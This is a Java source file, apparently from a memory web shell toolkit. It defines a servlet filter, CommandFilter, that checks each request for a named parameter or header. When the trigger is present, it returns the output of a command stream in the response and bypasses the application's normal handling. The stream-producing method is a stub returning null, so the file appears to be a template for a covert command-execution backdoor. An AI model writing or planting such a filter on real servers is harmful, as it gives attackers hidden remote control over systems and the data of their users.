package com.reajason.javaweb.memshell.shelltool.command;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.InputStream;
import java.util.Scanner;

/**
 * @author ReaJason
 * @since 2024/11/24
 */
public class CommandFilter implements Filter {
    private static String paramName;

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
        HttpServletRequest servletRequest = (HttpServletRequest) request;
        HttpServletResponse servletResponse = (HttpServletResponse) response;
        try {
            String p = servletRequest.getParameter(paramName);
            if (p == null || p.isEmpty()) {
                p = servletRequest.getHeader(paramName);
            }
            if (p != null) {
                String param = getParam(p);
                InputStream inputStream = getInputStream(param);
                response.getWriter().write(new Scanner(inputStream).useDelimiter("\\A").next());
                response.getWriter().flush();
                response.getWriter().close();
                return;
            }
        } catch (Throwable e) {
            e.printStackTrace();
        }
        chain.doFilter(servletRequest, servletResponse);
    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
    }

    private String getParam(String param) {
        return param;
    }

    private InputStream getInputStream(String param) throws Exception {
        return null;
    }

    @Override
    public void destroy() {
    }
}